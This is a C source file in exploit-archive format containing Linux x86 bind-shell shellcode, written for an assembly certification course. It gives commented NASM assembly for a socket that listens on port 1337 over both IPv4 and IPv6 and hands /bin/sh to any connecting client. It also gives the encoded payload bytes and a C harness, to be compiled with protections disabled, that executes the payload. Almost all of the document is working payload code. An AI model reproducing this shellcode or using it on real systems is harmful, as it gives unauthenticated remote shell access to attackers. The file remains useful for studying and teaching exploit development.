/*
# Exploit Title: Linux x86 Dual Network Stack (IPv4 and IPv6) Bind TCP Shellcode
# Date: 2018-08-18
# Shellcode Author: Kevin Kirsche
# Shellcode Repository: https://github.com/kkirsche/SLAE/tree/master/assignment_1-bind_shell
# Tested on: Shell on Ubuntu 18.04 with gcc 7.3.0 / Connected from Kali 2018.2

# This shellcode will listen on port 1337 on all of the host's IPv4 and IPv6 addresses and give you /bin/sh

This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
Student ID: SLAE-1134

Compilation instructions:
	gcc -o shellcode shellcode.c -fno-stack-protector -z execstack

Commented NASM:
global _start

section .text

_start:
  ; socket
  ;; cleanup
  xor ebx, ebx
  ;; arguments
  push ebx        ; #define IP_PROTO 0
  push 0x1        ; #define SOCK_STREAM 1
  push 0xa        ; #define PF_INET6 10
  ;; function
  mov ecx, esp    ; pointer to args on the stack into ecx
  push 0x66
  pop eax         ; socketcall 0x66 == 102
  inc ebx         ; #define SYS_SOCKET 1
  ;; call
  int 0x80
  ;; returned data
  xchg esi, eax   ; sockfd eax -> esi

  ; setsocketopt
  ;; cleanup
  xor eax, eax
  ;; arguments
  push eax        ; NO = 0x0
  mov edx, esp    ; get a pointer to the null value
  push 0x2        ; sizeof(NO)
  push edx        ; pointer to NO
  push 0x1a       ; #define IPV6_V6ONLY 26
  push 0x29       ; #define IPPROTO_IPV6
  ;; function
  mov ecx, esp    ; pointer to args on the stack into ecx
  mov al, 0x66    ; socketcall 0x66 == 102
  mov bl, 0xe     ; #define SYS_SETSOCKOPT 14
  ;; call
  int 0x80

  ; bind ipv4
  ;; cleanup
  xor edx, edx
  ;; v4lhost struct
  push edx          ; #define INADDR_ANY 0
  push word 0x3905  ; port 1337 in big endian format
  push 0x2          ; #define AF_INET 2
  ;; arguments
  mov ecx, esp      ; pointer to v4lhost struct arguments
  push 0x10         ; sizeof v4lhost
  push ecx          ; pointer v4lhost
  push esi          ; push sockfd onto stack
  ;; function
  mov ecx, esp      ; argument pointer into ecx
  mov bl, 0x2       ; #define SYS_BIND 2
  mov al, 0x66      ; socketcall 0x66 == 102
  ;; call
  int 0x80

  ; bind ipv6
  ;; cleanup
  xor eax, eax
  ;; v6lhost struct
  push dword eax    ; v6_host.sin6_addr
  push dword eax
  push dword eax
  push dword eax
  push dword eax
  push word 0x3905  ; port 1337
  push word 0x0a    ; PF_INET6
  ;; arguments
  mov ecx, esp      ; pointer to struct into ecx
  push 0x1c         ; sizeof struct
  push ecx          ; pointer to struct
  push esi          ; sockfd
  ;; function
  mov ecx, esp      ; arguments into register
  mov bl, 0x2       ; #define SYS_BIND 2
  mov al, 0x66      ; socketcall 0x66 == 102
  ;; call
  int 0x80

  ; listen
  ;; arguments
  push byte 0x2     ; queuelimit = 2
  push esi          ; sockfd
  ;; function
  mov ecx, esp      ; pointer to args into ecx
  mov bl, 0x4       ; #define SYS_LISTEN 4
  mov al, 0x66      ; socketcall 0x66 == 102
  ;; call
  int 0x80

  ; accept
  ;; cleanup
  xor ebx, ebx
  ;;arguments
  push ebx          ; push NULL
  push ebx          ; push NULL
  push esi          ; sockfd
  ;; function
  mov ecx, esp      ; pointer to args into ecx
  mov bl, 0x5       ; #define SYS_ACCEPT 5
  mov al, 0x66      ; socketcall 0x66 == 102
  ;; call
  int 0x80
  ;; returned data
  xchg ebx, eax     ; ebx holds the new sockfd that we accepted

  ; dup file descriptor
  ;; setup counters
  sub ecx, ecx      ; zero out ecx
  mov cl, 0x2       ; create a counter
  ;; loop
duploop:
  mov al, 0x3f      ; SYS_DUP2 syscall
  int 0x80          ; call SYS_DUP2
  dec ecx           ; decrement loop counter
  jns duploop       ; as long as SF is not set, keep looping

  ; execve
  ;; cleanup
  xor edx, edx
  ;; command to run
  push edx          ; NULL string terminator
  push 0x68732f2f   ; hs//
  push 0x6e69622f   ; nib/
  ;; arguments
  mov ebx, esp      ; pointer to args into ebx
  push edx          ; null ARGV
  push ebx          ; command to run
  ;; function
  mov ecx, esp
  mov al, 0x0b      ; execve systemcall
  int 0x80
*/
#include <stdio.h>
#include <string.h>

unsigned char code[] = "\x31\xdb\x53\x6a\x01\x6a\x0a\x89\xe1\x6a\x66\x58\x43"
  "\xcd\x80\x96\x31\xc0\x50\x89\xe2\x6a\x02\x52\x6a\x1a\x6a\x29\x89\xe1\xb0"
  "\x66\xb3\x0e\xcd\x80\x31\xd2\x52\x66\x68\x05\x39\x6a\x02\x89\xe1\x6a\x10"
  "\x51\x56\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x31\xc0\x50\x50\x50\x50\x50\x66"
  "\x68\x05\x39\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x89\xe1\xb3\x02\xb0\x66"
  "\xcd\x80\x6a\x02\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xdb\x53\x53\x56"
  "\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x93\x29\xc9\xb1\x02\xb0\x3f\xcd\x80\x49"
  "\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
  "\x53\x89\xe1\xb0\x0b\xcd\x80";


int main() {
  // pollute the registers
  asm("mov $0x78975432, %eax\n\t"
      "mov $0x17645589, %ecx\n\t"
      "mov $0x23149875, %edx\n\t");

  // begin shellcode
	printf("Shellcode Length:  %d\n", strlen(code));
  // execute our shellcode
	int (*ret)() = (int(*)())code;
	ret();
}